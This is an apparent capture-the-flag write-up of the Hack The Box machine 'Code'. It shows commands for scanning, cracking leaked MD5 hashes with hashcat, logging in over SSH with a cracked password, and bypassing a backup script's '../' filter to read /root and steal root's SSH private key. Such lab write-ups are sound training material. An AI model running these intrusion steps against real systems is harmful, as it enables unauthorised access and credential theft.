---
layout: writeup
name: "Code"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/code/
os: "Hack The Box"
date: 2025-11-12
pwned: true
---

# HTB Writeup: Code
![image (7)](https://github.com/user-attachments/assets/360ee681-9772-49b8-990a-3a99c3c526ea)

## 🧪 Machine Name: `Code`

**Platform:** Hack The Box  
**IP Address:** `10.10.11.62`  
**Difficulty:** Easy Linux

---

## 🧭 Overview

The Code box presents a realistic challenge involving password cracking, SQL exploration, path traversal, and privilege escalation through creative abuse of a flawed backup script (`backy.sh`). The key flow is:  
- MD5 password cracking → user shell  
- sudo `backy.sh` path bypass → read `/root` and capture `root.txt`  
- SSH private key extraction → root SSH login.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- 10.10.11.62 --min-rate 10000
nmap -p 22,5000 10.10.11.62 -sCV -oN nmapscan
```

Open ports: `22/SSH`, `5000/HTTP (Gunicorn)` → Python code editor on web.

### 🔍 Web Recon

- Found **SQLAlchemy query leak** → User list exposed.
- MD5 hashes extracted:

```bash
759b74ce43947f5f4c91aeddc3e5bad3 → development
3de6f30c4a09c27fc71932bfc68474be → nafeelswordsmaster
```

- Cracked with:

```bash
hashcat -m 0 hash.txt rockyou.txt
```

### 🔍 User Access

```bash
ssh martin@10.10.11.62
Password: nafeelswordsmaster
```

Found: `/home/app-production/app`, `user.txt`, and `task.json`

---

## ⚔️ Privilege Escalation

### Sudo NOPASSWD:

```bash
sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

### Path Traversal to `/root`

The `backy.sh` script filters `../` but not equivalent sequences:

```json
"directories_to_archive": [
    "/home/../root/"
]
```

```bash
sudo backy.sh hi.json
tar -xvjf code_home_.._root_2025_June.tar.bz2
cat root/root.txt
```

### Final Root SSH Access

- Extracted `/root/.ssh/id_rsa`
- SSH as root:

```bash
ssh root@10.10.11.62 -i id_rsa
```

## 🧠 Lessons Learned

- How to bypass naive path filtering in bash+JSON scripts.
- The importance of understanding tar behavior and symlink limitations.
- SQLAlchemy enumeration leaks.
- Using hashid + hashcat efficiently.
- New tooling: **hashid**, **pipx** (for git-dumper etc).

---

*Writeup by inksec*  
*GitHub: [https://github.com/inkedqt]*
